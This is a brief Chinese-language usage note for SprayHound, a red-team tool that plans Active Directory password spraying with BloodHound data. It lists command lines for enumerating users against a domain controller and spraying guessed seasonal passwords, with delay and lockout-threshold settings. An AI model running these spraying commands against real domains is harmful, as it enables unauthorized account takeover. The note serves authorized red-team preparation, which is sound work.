# SprayHound 使用

SprayHound 用于结合 BloodHound 数据做密码喷洒规划，重点是控制锁定风险和选择低风险账号集合。它适合红队演练前的策略准备。

## 数据准备

```bash
sprayhound --help
```

```bash
sprayhound -u user -p pass -d domain.local --dc 192.168.1.10 --users users.txt
```

```bash
sprayhound -u user -p pass -d domain.local --dc 192.168.1.10 --bloodhound bloodhound.zip
```

## 喷洒计划

```bash
sprayhound --users users.txt --password 'Summer2026!' --delay 60 --jitter 20
```

```bash
sprayhound --users users.txt --passwords passwords.txt --lockout-threshold 5
```

```bash
sprayhound --users users.txt --exclude privileged.txt --password 'Welcome2026!'
```

小记录：密码喷洒要先确认锁定阈值、观察窗口和授权时间。高权限账号、服务账号和脆弱业务时段都要从计划里排除。
